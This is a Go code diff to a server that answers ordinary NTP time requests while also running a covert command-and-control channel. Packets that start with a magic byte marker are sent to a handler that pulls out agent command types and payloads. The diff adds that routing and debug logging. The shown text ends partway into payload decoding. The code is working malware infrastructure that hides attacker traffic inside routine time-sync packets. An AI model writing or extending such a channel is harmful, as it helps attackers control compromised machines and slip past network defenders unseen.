@@ -115,8 +115,24 @@ func systemToNTPTime(t time.Time) uint64 {
 
 // processPacket handles a received NTP packet
 func (s *NTPServer) processPacket(data []byte, addr net.Addr) {
+
 	// Get client IP address
 	clientIP := addr.(*net.UDPAddr).IP.String()
+
+	log.Printf("Received packet from %s, length: %d bytes", clientIP, len(data))
+
+	// Debug: Dump the first 16 bytes of each packet
+	if len(data) >= 16 {
+		log.Printf("Packet header: % x", data[:16])
+	}
+
+	// Check if this is a C2 packet (our baseline marker)
+	if bytes.HasPrefix(data, []byte{0x1a, 0x01, 0x0a, 0xf0}) {
+		log.Printf("C2 packet identified from %s", clientIP)
+		// This is a C2 packet, process it
+		s.processC2Packet(data, clientIP, addr)
+		return
+	}
 
 	// Check if this is a valid NTP packet
 	if len(data) < 48 {
@@ -138,6 +154,9 @@ func (s *NTPServer) processPacket(data []byte, addr net.Addr) {
 
 // handleStandardNTP responds to a standard NTP request
 func (s *NTPServer) handleStandardNTP(data []byte, addr net.Addr) {
+
+	log.Printf("Handling standard NTP request from %s", addr.String())
+
 	// Simple NTP server implementation
 	response := make([]byte, 48)
 
@@ -189,12 +208,15 @@ func (s *NTPServer) handleStandardNTP(data []byte, addr net.Addr) {
 
 // processC2Packet processes a C2 packet received from an agent
 func (s *NTPServer) processC2Packet(data []byte, clientIP string, addr net.Addr) {
+
 	if len(data) < 15 {
 		return // Not enough data for a valid C2 packet
 	}
 
 	// Extract the command type
 	commandType := string(data[11:15])
+
+	log.Printf("Processing C2 packet from %s, command type: %s", clientIP, commandType)
 
 	// Extract and decode the payload if present
 	var payload string
